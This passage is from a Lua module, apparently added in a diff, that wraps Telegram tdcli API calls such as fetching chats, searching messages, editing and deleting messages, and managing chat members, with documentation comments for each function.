its identifier, offline request if current user is not a bot +-- @channel_id Channel identifier +local function getChannel(channel_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetChannel"", +    channel_id_ = getChatId(channel_id).ID +  }, dl_cb, cmd) +end + +M.getChannel = getChannel + +-- Returns full information about a channel by its identifier, cached for at most 1 minute +-- @channel_id Channel identifier +local function getChannelFull(channel_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetChannelFull"", +    channel_id_ = getChatId(channel_id).ID +  }, dl_cb, cmd) +end + +M.getChannelFull = getChannelFull + +-- Returns information about a secret chat by its identifier, offline request +-- @secret_chat_id Secret chat identifier +local function getSecretChat(secret_chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetSecretChat"", +    secret_chat_id_ = secret_chat_id +  }, dl_cb, cmd) +end + +M.getSecretChat = getSecretChat + +-- Returns information about a chat by its identifier, offline request if current user is not a bot +-- @chat_id Chat identifier +local function getChat(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetChat"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.getChat = getChat + +-- Returns information about a message +-- @chat_id Identifier of the chat, message belongs to +-- @message_id Identifier of the message to get +local function getMessage(chat_id, message_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetMessage"", +    chat_id_ = chat_id, +    message_id_ = message_id +  }, dl_cb, cmd) +end + +M.getMessage = getMessage + +-- Returns information about messages. +-- If message is not found, returns null on the corresponding position of the result +-- @chat_id Identifier of the chat, messages belongs to +-- @message_ids Identifiers of the messages to get +local function getMessages(chat_id, message_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetMessages"", +    chat_id_ = chat_id, +    message_ids_ = message_ids -- vector +  }, dl_cb, cmd) +end + +M.getMessages = getMessages + +-- Returns information about a file, offline request +-- @file_id Identifier of the file to get +local function getFile(file_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetFile"", +    file_id_ = file_id +  }, dl_cb, cmd) +end + +M.getFile = getFile + +-- Returns information about a file by its persistent id, offline request +-- @persistent_file_id Persistent identifier of the file to get +local function getFilePersistent(persistent_file_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetFilePersistent"", +    persistent_file_id_ = persistent_file_id +  }, dl_cb, cmd) +end + +M.getFilePersistent = getFilePersistent + +-- Returns list of chats in the right order, chats are sorted by (order, chat_id) in decreasing order. +-- For example, to get list of chats from the beginning, the offset_order should be equal 2^63 - 1 +-- @offset_order Chat order to return chats from +-- @offset_chat_id Chat identifier to return chats from +-- @limit Maximum number of chats to be returned +local function getChats(offset_order, offset_chat_id, limit, dl_cb, cmd) +  if not limit or limit > 20 then +    limit = 20 +  end + +  tdcli_function ({ +    ID = ""GetChats"", +    offset_order_ = offset_order or 9223372036854775807, +    offset_chat_id_ = offset_chat_id or 0, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.getChats = getChats + +-- Searches public chat by its username. +-- Currently only private and channel chats can be public. +-- Returns chat if found, otherwise some error is returned +-- @username Username to be resolved +local function searchPublicChat(username, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SearchPublicChat"", +    username_ = username +  }, dl_cb, cmd) +end + +M.searchPublicChat = searchPublicChat + +-- Searches public chats by prefix of their username. +-- Currently only private and channel (including supergroup) chats can be public. +-- Returns meaningful number of results. +-- Returns nothing if length of the searched username prefix is less than 5. +-- Excludes private chats with contacts from the results +-- @username_prefix Prefix of the username to search +local function searchPublicChats(username_prefix, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SearchPublicChats"", +    username_prefix_ = username_prefix +  }, dl_cb, cmd) +end + +M.searchPublicChats = searchPublicChats + +-- Searches for specified query in the title and username of known chats, offline request. +-- Returns chats in the order of them in the chat list +-- @query Query to search for, if query is empty, returns up to 20 recently found chats +-- @limit Maximum number of chats to be returned +local function searchChats(query, limit, dl_cb, cmd) +  if not limit or limit > 20 then +    limit = 20 +  end + +  tdcli_function ({ +    ID = ""SearchChats"", +    query_ = query, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.searchChats = searchChats + +-- Adds chat to the list of recently found chats. +-- The chat is added to the beginning of the list. +-- If the chat is already in the list, at first it is removed from the list +-- @chat_id Identifier of the chat to add +local function addRecentlyFoundChat(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""AddRecentlyFoundChat"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.addRecentlyFoundChat = addRecentlyFoundChat + +-- Deletes chat from the list of recently found chats +-- @chat_id Identifier of the chat to delete +local function deleteRecentlyFoundChat(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteRecentlyFoundChat"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.deleteRecentlyFoundChat = deleteRecentlyFoundChat + +-- Clears list of recently found chats +local function deleteRecentlyFoundChats(dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteRecentlyFoundChats"", +  }, dl_cb, cmd) +end + +M.deleteRecentlyFoundChats = deleteRecentlyFoundChats + +-- Returns list of common chats with an other given user. +-- Chats are sorted by their type and creation date +-- @user_id User identifier +-- @offset_chat_id Chat identifier to return chats from, use 0 for the first request +-- @limit Maximum number of chats to be returned, up to 100 +local function getCommonChats(user_id, offset_chat_id, limit, dl_cb, cmd) +  if not limit or limit > 100 then +    limit = 100 +  end + +  tdcli_function ({ +    ID = ""GetCommonChats"", +    user_id_ = user_id, +    offset_chat_id_ = offset_chat_id, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.getCommonChats = getCommonChats + +-- Returns messages in a chat. +-- Automatically calls openChat. +-- Returns result in reverse chronological order, i.e. in order of decreasing message.message_id +-- @chat_id Chat identifier +-- @from_message_id Identifier of the message near which we need a history, you can use 0 to get results from the beginning, i.e. from oldest to newest +-- @offset Specify 0 to get results exactly from from_message_id or negative offset to get specified message and some newer messages +-- @limit Maximum number of messages to be returned, should be positive and can\'t be greater than 100. +-- If offset is negative, limit must be greater than -offset. +-- There may be less than limit messages returned even the end of the history is not reached +local function getChatHistory(chat_id, from_message_id, offset, limit, dl_cb, cmd) +  if not limit or limit > 100 then +    limit = 100 +  end + +  tdcli_function ({ +    ID = ""GetChatHistory"", +    chat_id_ = chat_id, +    from_message_id_ = from_message_id, +    offset_ = offset or 0, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.getChatHistory = getChatHistory + +-- Deletes all messages in the chat. +-- Can\'t be used for channel chats +-- @chat_id Chat identifier +-- @remove_from_chat_list Pass true, if chat should be removed from the chat list +local function deleteChatHistory(chat_id, remove_from_chat_list, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteChatHistory"", +    chat_id_ = chat_id, +    remove_from_chat_list_ = remove_from_chat_list +  }, dl_cb, cmd) +end + +M.deleteChatHistory = deleteChatHistory + +-- Searches for messages with given words in the chat. +-- Returns result in reverse chronological order, i. e. in order of decreasimg message_id. +-- Doesn\'t work in secret chats +-- @chat_id Chat identifier to search in +-- @query Query to search for +-- @from_message_id Identifier of the message from which we need a history, you can use 0 to get results from beginning +-- @limit Maximum number of messages to be returned, can\'t be greater than 100 +-- @filter Filter for content of searched messages +-- filter = Empty|Animation|Audio|Document|Photo|Video|Voice|PhotoAndVideo|Url|ChatPhoto +local function searchChatMessages(chat_id, query, from_message_id, limit, filter, dl_cb, cmd) +  if not limit or limit > 100 then +    limit = 100 +  end + +  tdcli_function ({ +    ID = ""SearchChatMessages"", +    chat_id_ = chat_id, +    query_ = query, +    from_message_id_ = from_message_id, +    limit_ = limit, +    filter_ = { +      ID = \'SearchMessagesFilter\' .. filter +    }, +  }, dl_cb, cmd) +end + +M.searchChatMessages = searchChatMessages + +-- Searches for messages in all chats except secret chats. Returns result in reverse chronological order, i. e. in order of decreasing (date, chat_id, message_id) +-- @query Query to search for +-- @offset_date Date of the message to search from, you can use 0 or any date in the future to get results from the beginning +-- @offset_chat_id Chat identifier of the last found message or 0 for the first request +-- @offset_message_id Message identifier of the last found message or 0 for the first request +-- @limit Maximum number of messages to be returned, can\'t be greater than 100 +local function searchMessages(query, offset_date, offset_chat_id, offset_message_id, limit, dl_cb, cmd) +  if not limit or limit > 100 then +    limit = 100 +  end + +  tdcli_function ({ +    ID = ""SearchMessages"", +    query_ = query, +    offset_date_ = offset_date, +    offset_chat_id_ = offset_chat_id, +    offset_message_id_ = offset_message_id, +    limit_ = limit +  }, dl_cb, cmd) +end + +M.searchMessages = searchMessages + +-- Invites bot to a chat (if it is not in the chat) and send /start to it. +-- Bot can\'t be invited to a private chat other than chat with the bot. +-- Bots can\'t be invited to broadcast channel chats and secret chats. +-- Returns sent message. +-- UpdateChatTopMessage will not be sent, so returned message should be used to update chat top message +-- @bot_user_id Identifier of the bot +-- @chat_id Identifier of the chat +-- @parameter Hidden parameter sent to bot for deep linking (https://api.telegram.org/bots#deep-linking) +-- parameter=start|startgroup or custom as defined by bot creator +local function sendBotStartMessage(bot_user_id, chat_id, parameter, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendBotStartMessage"", +    bot_user_id_ = bot_user_id, +    chat_id_ = chat_id, +    parameter_ = parameter +  }, dl_cb, cmd) +end + +M.sendBotStartMessage = sendBotStartMessage + +-- Sends result of the inline query as a message. +-- Returns sent message. +-- UpdateChatTopMessage will not be sent, so returned message should be used to update chat top message. +-- Always clears chat draft message +-- @chat_id Chat to send message +-- @reply_to_message_id Identifier of a message to reply to or 0 +-- @disable_notification Pass true, to disable notification about the message, doesn\'t works in secret chats +-- @from_background Pass true, if the message is sent from background +-- @query_id Identifier of the inline query +-- @result_id Identifier of the inline result +local function sendInlineQueryResultMessage(chat_id, reply_to_message_id, disable_notification, from_background, query_id, result_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendInlineQueryResultMessage"", +    chat_id_ = chat_id, +    reply_to_message_id_ = reply_to_message_id, +    disable_notification_ = disable_notification, +    from_background_ = from_background, +    query_id_ = query_id, +    result_id_ = result_id +  }, dl_cb, cmd) +end + +M.sendInlineQueryResultMessage = sendInlineQueryResultMessage + +-- Forwards previously sent messages. +-- Returns forwarded messages in the same order as message identifiers passed in message_ids. +-- If message can\'t be forwarded, null will be returned instead of the message. +-- UpdateChatTopMessage will not be sent, so returned messages should be used to update chat top message +-- @chat_id Identifier of a chat to forward messages +-- @from_chat_id Identifier of a chat to forward from +-- @message_ids Identifiers of messages to forward +-- @disable_notification Pass true, to disable notification about the message, doesn\'t works if messages are forwarded to secret chat +-- @from_background Pass true, if the message is sent from background +local function forwardMessages(chat_id, from_chat_id, message_ids, disable_notification, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ForwardMessages"", +    chat_id_ = chat_id, +    from_chat_id_ = from_chat_id, +    message_ids_ = message_ids, -- vector +    disable_notification_ = disable_notification, +    from_background_ = 1 +  }, dl_cb, cmd) +end + +M.forwardMessages = forwardMessages + +-- Changes current ttl setting in a secret chat and sends corresponding message +-- @chat_id Chat identifier +-- @ttl New value of ttl in seconds +local function sendChatSetTtlMessage(chat_id, ttl, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendChatSetTtlMessage"", +    chat_id_ = chat_id, +    ttl_ = ttl +  }, dl_cb, cmd) +end + +M.sendChatSetTtlMessage = sendChatSetTtlMessage + +-- Deletes messages. +-- UpdateDeleteMessages will not be sent for messages deleted through that function +-- @chat_id Chat identifier +-- @message_ids Identifiers of messages to delete +local function deleteMessages(chat_id, message_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteMessages"", +    chat_id_ = chat_id, +    message_ids_ = message_ids -- vector +  }, dl_cb, cmd) +end + +M.deleteMessages = deleteMessages + +-- Deletes all messages in the chat sent by the specified user. +-- Works only in supergroup channel chats, needs appropriate privileges +-- @chat_id Chat identifier +-- @user_id User identifier +local function deleteMessagesFromUser(chat_id, user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteMessagesFromUser"", +    chat_id_ = chat_id, +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.deleteMessagesFromUser = deleteMessagesFromUser + +-- Edits text of text or game message. +-- Non-bots can edit message in a limited period of time. +-- Returns edited message after edit is complete server side +-- @chat_id Chat the message belongs to +-- @message_id Identifier of the message +-- @reply_markup Bots only. New message reply markup +-- @input_message_content New text content of the message. Should be of type InputMessageText +local function editMessageText(chat_id, message_id, reply_markup, text, disable_web_page_preview, parse_mode, dl_cb, cmd) +  local TextParseMode = getParseMode(parse_mode) + +  tdcli_function ({ +    ID = ""EditMessageText"", +    chat_id_ = chat_id, +    message_id_ = message_id, +    reply_markup_ = reply_markup, -- reply_markup:ReplyMarkup +    input_message_content_ = { +      ID = ""InputMessageText"", +      text_ = text, +      disable_web_page_preview_ = disable_web_page_preview, +      clear_draft_ = 0, +      entities_ = {}, +      parse_mode_ = TextParseMode, +    }, +  }, dl_cb, cmd) +end + +M.editMessageText = editMessageText + +-- Edits message content caption. +-- Non-bots can edit message in a limited period of time. +-- Returns edited message after edit is complete server side +-- @chat_id Chat the message belongs to +-- @message_id Identifier of the message +-- @reply_markup Bots only. New message reply markup +-- @caption New message content caption, 0-200 characters +local function editMessageCaption(chat_id, message_id, reply_markup, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""EditMessageCaption"", +    chat_id_ = chat_id, +    message_id_ = message_id, +    reply_markup_ = reply_markup, -- reply_markup:ReplyMarkup +    caption_ = caption +  }, dl_cb, cmd) +end + +M.editMessageCaption = editMessageCaption + +-- Bots only. +-- Edits message reply markup. +-- Returns edited message after edit is complete server side +-- @chat_id Chat the message belongs to +-- @message_id Identifier of the message +-- @reply_markup New message reply markup +local function editMessageReplyMarkup(inline_message_id, reply_markup, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""EditInlineMessageCaption"", +    inline_message_id_ = inline_message_id, +    reply_markup_ = reply_markup, -- reply_markup:ReplyMarkup +    caption_ = caption +  }, dl_cb, cmd) +end + +M.editMessageReplyMarkup = editMessageReplyMarkup + +-- Bots only. +-- Edits text of an inline text or game message sent via bot +-- @inline_message_id Inline message identifier +-- @reply_markup New message reply markup +-- @input_message_content New text content of the message. Should be of type InputMessageText +local function editInlineMessageText(inline_message_id, reply_markup, text, disable_web_page_preview, dl_cb, cmd) +  tdcli_function ({ +    ID = ""EditInlineMessageText"", +    inline_message_id_ = inline_message_id, +    reply_markup_ = reply_markup, -- reply_markup:ReplyMarkup +    input_message_content_ = { +      ID = ""InputMessageText"", +      text_ = text, +      disable_web_page_preview_ = disable_web_page_preview, +      clear_draft_ = 0, +      entities_ = {} +    }, +  }, dl_cb, cmd) +end + +M.editInlineMessageText = editInlineMessageText + +-- Bots only. +-- Edits caption of an inline message content sent via bot +-- @inline_message_id Inline message identifier +-- @reply_markup New message reply markup +-- @caption New message content caption, 0-200 characters +local function editInlineMessageCaption(inline_message_id, reply_markup, caption, dl_cb, cmd) +  tdcli_function ({ +    ID = ""EditInlineMessageCaption"", +    inline_message_id_ = inline_message_id, +    reply_markup_ = reply_markup, -- reply_markup:ReplyMarkup +    caption_ = caption +  }, dl_cb, cmd) +end + +M.editInlineMessageCaption = editInlineMessageCaption + +-- Bots only. +-- Edits reply markup of an inline message sent via bot +-- @inline_message_id Inline message identifier +-- @reply_markup New message reply markup +local function editInlineMessageReplyMarkup(inline_message_id, reply_markup, dl_cb, cmd) +  tdcli_function ({ +    ID = ""EditInlineMessageReplyMarkup"", +    inline_message_id_ = inline_message_id, +    reply_markup_ = reply_markup -- reply_markup:ReplyMarkup +  }, dl_cb, cmd) +end + +M.editInlineMessageReplyMarkup = editInlineMessageReplyMarkup + + +-- Sends inline query to a bot and returns its results. +-- Unavailable for bots +-- @bot_user_id Identifier of the bot send query to +-- @chat_id Identifier of the chat, where the query is sent +-- @user_location User location, only if needed +-- @query Text of the query +-- @offset Offset of the first entry to return +local function getInlineQueryResults(bot_user_id, chat_id, latitude, longitude, query, offset, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetInlineQueryResults"", +    bot_user_id_ = bot_user_id, +    chat_id_ = chat_id, +    user_location_ = { +      ID = ""Location"", +      latitude_ = latitude, +      longitude_ = longitude +    }, +    query_ = query, +    offset_ = offset +  }, dl_cb, cmd) +end + +M.getInlineQueryResults = getInlineQueryResults + +-- Bots only. +-- Sets result of the inline query +-- @inline_query_id Identifier of the inline query +-- @is_personal Does result of the query can be cached only for specified user +-- @results Results of the query +-- @cache_time Allowed time to cache results of the query in seconds +-- @next_offset Offset for the next inline query, pass empty string if there is no more results +-- @switch_pm_text If non-empty, this text should be shown on the button, which opens private chat with the bot and sends bot start message with parameter switch_pm_parameter +-- @switch_pm_parameter Parameter for the bot start message +local function answerInlineQuery(inline_query_id, is_personal, cache_time, next_offset, switch_pm_text, switch_pm_parameter, dl_cb, cmd) +  tdcli_function ({ +    ID = ""AnswerInlineQuery"", +    inline_query_id_ = inline_query_id, +    is_personal_ = is_personal, +    results_ = results, --vector<InputInlineQueryResult>, +    cache_time_ = cache_time, +    next_offset_ = next_offset, +    switch_pm_text_ = switch_pm_text, +    switch_pm_parameter_ = switch_pm_parameter +  }, dl_cb, cmd) +end + +M.answerInlineQuery = answerInlineQuery + +-- Sends callback query to a bot and returns answer to it. +-- Unavailable for bots +-- @chat_id Identifier of the chat with a message +-- @message_id Identifier of the message, from which the query is originated +-- @payload Query payload +-- @text Text of the answer +-- @show_alert If true, an alert should be shown to the user instead of a toast +-- @url URL to be open +local function getCallbackQueryAnswer(chat_id, message_id, text, show_alert, url, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetCallbackQueryAnswer"", +    chat_id_ = chat_id, +    message_id_ = message_id, +    payload_ = { +      ID = ""CallbackQueryAnswer"", +      text_ = text, +      show_alert_ = show_alert, +      url_ = url +    }, +  }, dl_cb, cmd) +end + +M.getCallbackQueryAnswer = getCallbackQueryAnswer + +-- Bots only. +-- Sets result of the callback query +-- @callback_query_id Identifier of the callback query +-- @text Text of the answer +-- @show_alert If true, an alert should be shown to the user instead of a toast +-- @url Url to be opened +-- @cache_time Allowed time to cache result of the query in seconds +local function answerCallbackQuery(callback_query_id, text, show_alert, url, cache_time, dl_cb, cmd) +  tdcli_function ({ +    ID = ""AnswerCallbackQuery"", +    callback_query_id_ = callback_query_id, +    text_ = text, +    show_alert_ = show_alert, +    url_ = url, +    cache_time_ = cache_time +  }, dl_cb, cmd) +end + +M.answerCallbackQuery = answerCallbackQuery + +-- Bots only. +-- Updates game score of the specified user in the game +-- @chat_id Chat a message with the game belongs to +-- @message_id Identifier of the message +-- @edit_message True, if message should be edited +-- @user_id User identifier +-- @score New score +-- @force Pass True to update the score even if it decreases. If score is 0, user will be deleted from the high scores table +local function setGameScore(chat_id, message_id, edit_message, user_id, score, force, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetGameScore"", +    chat_id_ = chat_id, +    message_id_ = message_id, +    edit_message_ = edit_message, +    user_id_ = user_id, +    score_ = score, +    force_ = force +  }, dl_cb, cmd) +end + +M.setGameScore = setGameScore + +-- Bots only. +-- Updates game score of the specified user in the game +-- @inline_message_id Inline message identifier +-- @edit_message True, if message should be edited +-- @user_id User identifier +-- @score New score +-- @force Pass True to update the score even if it decreases. If score is 0, user will be deleted from the high scores table +local function setInlineGameScore(inline_message_id, edit_message, user_id, score, force, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SetInlineGameScore"", +    inline_message_id_ = inline_message_id, +    edit_message_ = edit_message, +    user_id_ = user_id, +    score_ = score, +    force_ = force +  }, dl_cb, cmd) +end + +M.setInlineGameScore = setInlineGameScore + +-- Bots only. +-- Returns game high scores and some part of the score table around of the specified user in the game +-- @chat_id Chat a message with the game belongs to +-- @message_id Identifier of the message +-- @user_id User identifie +local function getGameHighScores(chat_id, message_id, user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetGameHighScores"", +    chat_id_ = chat_id, +    message_id_ = message_id, +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.getGameHighScores = getGameHighScores + +-- Bots only. +-- Returns game high scores and some part of the score table around of the specified user in the game +-- @inline_message_id Inline message identifier +-- @user_id User identifier +local function getInlineGameHighScores(inline_message_id, user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetInlineGameHighScores"", +    inline_message_id_ = inline_message_id, +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.getInlineGameHighScores = getInlineGameHighScores + +-- Deletes default reply markup from chat. +-- This method needs to be called after one-time keyboard or ForceReply reply markup has been used. +-- UpdateChatReplyMarkup will be send if reply markup will be changed +-- @chat_id Chat identifier +-- @message_id Message identifier of used keyboard +local function deleteChatReplyMarkup(chat_id, message_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""DeleteChatReplyMarkup"", +    chat_id_ = chat_id, +    message_id_ = message_id +  }, dl_cb, cmd) +end + +M.deleteChatReplyMarkup = deleteChatReplyMarkup + +-- Sends notification about user activity in a chat +-- @chat_id Chat identifier +-- @action Action description +-- action = Typing|Cancel|RecordVideo|UploadVideo|RecordVoice|UploadVoice|UploadPhoto|UploadDocument|GeoLocation|ChooseContact|StartPlayGame +local function sendChatAction(chat_id, action, progress, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendChatAction"", +    chat_id_ = chat_id, +    action_ = { +      ID = ""SendMessage"" .. action .. ""Action"", +      progress_ = progress or 100 +    } +  }, dl_cb, cmd) +end + +M.sendChatAction = sendChatAction + +-- Sends notification about screenshot taken in a chat. +-- Works only in secret chats +-- @chat_id Chat identifier +local function sendChatScreenshotTakenNotification(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""SendChatScreenshotTakenNotification"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.sendChatScreenshotTakenNotification = sendChatScreenshotTakenNotification + +-- Chat is opened by the user. +-- Many useful activities depends on chat being opened or closed. For example, in channels all updates are received only for opened chats +-- @chat_id Chat identifier +local function openChat(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""OpenChat"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.openChat = openChat + +-- Chat is closed by the user. +-- Many useful activities depends on chat being opened or closed. +-- @chat_id Chat identifier +local function closeChat(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CloseChat"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.closeChat = closeChat + +-- Messages are viewed by the user. +-- Many useful activities depends on message being viewed. For example, marking messages as read, incrementing of view counter, updating of view counter, removing of deleted messages in channels +-- @chat_id Chat identifier +-- @message_ids Identifiers of viewed messages +local function viewMessages(chat_id, message_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ViewMessages"", +    chat_id_ = chat_id, +    message_ids_ = message_ids -- vector +  }, dl_cb, cmd) +end + +M.viewMessages = viewMessages + +-- Message content is opened, for example the user has opened a photo, a video, a document, a location or a venue or have listened to an audio or a voice message +-- @chat_id Chat identifier of the message +-- @message_id Identifier of the message with opened content +local function openMessageContent(chat_id, message_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""OpenMessageContent"", +    chat_id_ = chat_id, +    message_id_ = message_id +  }, dl_cb, cmd) +end + +M.openMessageContent = openMessageContent + +-- Returns existing chat corresponding to the given user +-- @user_id User identifier +local function createPrivateChat(user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CreatePrivateChat"", +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.createPrivateChat = createPrivateChat + +-- Returns existing chat corresponding to the known group +-- @group_id Group identifier +local function createGroupChat(group_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CreateGroupChat"", +    group_id_ = getChatId(group_id).ID +  }, dl_cb, cmd) +end + +M.createGroupChat = createGroupChat + +-- Returns existing chat corresponding to the known channel +-- @channel_id Channel identifier +local function createChannelChat(channel_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CreateChannelChat"", +    channel_id_ = getChatId(channel_id).ID +  }, dl_cb, cmd) +end + +M.createChannelChat = createChannelChat + +-- Returns existing chat corresponding to the known secret chat +-- @secret_chat_id SecretChat identifier +local function createSecretChat(secret_chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CreateSecretChat"", +    secret_chat_id_ = secret_chat_id +  }, dl_cb, cmd) +end + +M.createSecretChat = createSecretChat + +-- Creates new group chat and send corresponding messageGroupChatCreate, returns created chat +-- @user_ids Identifiers of users to add to the group +-- @title Title of new group chat, 0-255 characters +local function createNewGroupChat(user_ids, title, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CreateNewGroupChat"", +    user_ids_ = user_ids, -- vector +    title_ = title +  }, dl_cb, cmd) +end + +M.createNewGroupChat = createNewGroupChat + +-- Creates new channel chat and send corresponding messageChannelChatCreate, returns created chat +-- @title Title of new channel chat, 0-255 characters +-- @is_supergroup True, if supergroup chat should be created +-- @about Information about the channel, 0-255 characters +local function createNewChannelChat(title, is_supergroup, about, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CreateNewChannelChat"", +    title_ = title, +    is_supergroup_ = is_supergroup, +    about_ = about +  }, dl_cb, cmd) +end + +M.createNewChannelChat = createNewChannelChat + +-- Creates new secret chat, returns created chat +-- @user_id Identifier of a user to create secret chat with +local function createNewSecretChat(user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""CreateNewSecretChat"", +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.createNewSecretChat = createNewSecretChat + +-- Creates new channel supergroup chat from existing group chat and send corresponding messageChatMigrateTo and messageChatMigrateFrom. Deactivates group +-- @chat_id Group chat identifier +local function migrateGroupChatToChannelChat(chat_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""MigrateGroupChatToChannelChat"", +    chat_id_ = chat_id +  }, dl_cb, cmd) +end + +M.migrateGroupChatToChannelChat = migrateGroupChatToChannelChat + +-- Changes chat title. +-- Title can\'t be changed for private chats. +-- Title will not change until change will be synchronized with the server. +-- Title will not be changed if application is killed before it can send request to the server. +-- There will be update about change of the title on success. Otherwise error will be returned +-- @chat_id Chat identifier +-- @title New title of a chat, 0-255 characters +local function changeChatTitle(chat_id, title, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeChatTitle"", +    chat_id_ = chat_id, +    title_ = title +  }, dl_cb, cmd) +end + +M.changeChatTitle = changeChatTitle + +-- Changes chat photo. +-- Photo can\'t be changed for private chats. +-- Photo will not change until change will be synchronized with the server. +-- Photo will not be changed if application is killed before it can send request to the server. +-- There will be update about change of the photo on success. Otherwise error will be returned +-- @chat_id Chat identifier +-- @photo New chat photo. You can use zero InputFileId to delete photo. Files accessible only by HTTP URL are not acceptable +local function changeChatPhoto(chat_id, photo, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeChatPhoto"", +    chat_id_ = chat_id, +    photo_ = getInputFile(photo) +  }, dl_cb, cmd) +end + +M.changeChatPhoto = changeChatPhoto + +-- Changes chat draft message +-- @chat_id Chat identifier +-- @draft_message New draft message, nullable +local function changeChatDraftMessage(chat_id, reply_to_message_id, text, disable_web_page_preview, clear_draft, parse_mode, dl_cb, cmd) +  local TextParseMode = getParseMode(parse_mode) + +  tdcli_function ({ +    ID = ""ChangeChatDraftMessage"", +    chat_id_ = chat_id, +    draft_message_ = { +      ID = ""DraftMessage"", +      reply_to_message_id_ = reply_to_message_id, +      input_message_text_ = { +        ID = ""InputMessageText"", +        text_ = text, +        disable_web_page_preview_ = disable_web_page_preview, +        clear_draft_ = clear_draft, +        entities_ = {}, +        parse_mode_ = TextParseMode, +      }, +    }, +  }, dl_cb, cmd) +end + +M.changeChatDraftMessage = changeChatDraftMessage + +-- Adds new member to chat. +-- Members can\'t be added to private or secret chats. +-- Member will not be added until chat state will be synchronized with the server. +-- Member will not be added if application is killed before it can send request to the server +-- @chat_id Chat identifier +-- @user_id Identifier of the user to add +-- @forward_limit Number of previous messages from chat to forward to new member, ignored for channel chats +local function addChatMember(chat_id, user_id, forward_limit, dl_cb, cmd) +  tdcli_function ({ +    ID = ""AddChatMember"", +    chat_id_ = chat_id, +    user_id_ = user_id, +    forward_limit_ = forward_limit or 50 +  }, dl_cb, cmd) +end + +M.addChatMember = addChatMember + +-- Adds many new members to the chat. +-- Currently, available only for channels. +-- Can\'t be used to join the channel. +-- Member will not be added until chat state will be synchronized with the server. +-- Member will not be added if application is killed before it can send request to the server +-- @chat_id Chat identifier +-- @user_ids Identifiers of the users to add +local function addChatMembers(chat_id, user_ids, dl_cb, cmd) +  tdcli_function ({ +    ID = ""AddChatMembers"", +    chat_id_ = chat_id, +    user_ids_ = user_ids -- vector +  }, dl_cb, cmd) +end + +M.addChatMembers = addChatMembers + +-- Changes status of the chat member, need appropriate privileges. +-- In channel chats, user will be added to chat members if he is yet not a member and there is less than 200 members in the channel. +-- Status will not be changed until chat state will be synchronized with the server. +-- Status will not be changed if application is killed before it can send request to the server +-- @chat_id Chat identifier +-- @user_id Identifier of the user to edit status, bots can be editors in the channel chats +-- @status New status of the member in the chat +-- status = Creator|Editor|Moderator|Member|Left|Kicked +local function changeChatMemberStatus(chat_id, user_id, status, dl_cb, cmd) +  tdcli_function ({ +    ID = ""ChangeChatMemberStatus"", +    chat_id_ = chat_id, +    user_id_ = user_id, +    status_ = { +      ID = ""ChatMemberStatus"" .. status +    }, +  }, dl_cb, cmd) +end + +M.changeChatMemberStatus = changeChatMemberStatus + +-- Returns information about one participant of the chat +-- @chat_id Chat identifier +-- @user_id User identifier +local function getChatMember(chat_id, user_id, dl_cb, cmd) +  tdcli_function ({ +    ID = ""GetChatMember"", +    chat_id_ = chat_id, +    user_id_ = user_id +  }, dl_cb, cmd) +end + +M.getChatMember = getChatMember + +-- Asynchronously downloads file from cloud. +-- Updates updateFileProgress will notify about download progress. +-- Update updateFile will notify about successful download +-- @file_id Identifier of file to download +local function 